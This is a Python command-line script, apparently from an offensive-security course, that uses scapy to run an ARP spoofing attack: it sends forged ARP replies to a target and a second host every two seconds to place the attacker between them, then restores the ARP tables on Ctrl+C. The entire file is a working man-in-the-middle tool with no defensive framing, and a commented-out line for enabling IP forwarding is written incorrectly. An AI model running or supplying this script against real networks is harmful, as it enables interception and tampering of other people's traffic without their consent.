#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import optparse
import subprocess
import os


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Pls input target ip, e.g -t 10.0.2.13")
    parser.add_option("-s", "--spoof", dest="spoof", help="Pls input spoof ip, e.g -s 10.0.2.1")
    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("[-] Pls specify a target ip, user --help for more info.")
    elif not options.spoof:
        parser.error("[-] Pls specify a spoof ip, use --help for more info.")
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()


try:
    send_packets_count = 0
    while True:
        spoof(options.target, options.spoof)
        spoof(options.spoof, options.target)
        send_packets_count += 2
        print("\r[+] Packets sent: " + str(send_packets_count)),
        sys.stdout.flush()
        # subprocess.call(["echo", "1", ">/proc/sys/net/ipv4/ip_forward"], stdout=open(os.devnull, 'wb'))
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ..... Resetting AFP tables ..... Please wait.\n")
    restore(options.target, options.spoof)
    restore(options.spoof, options.target)
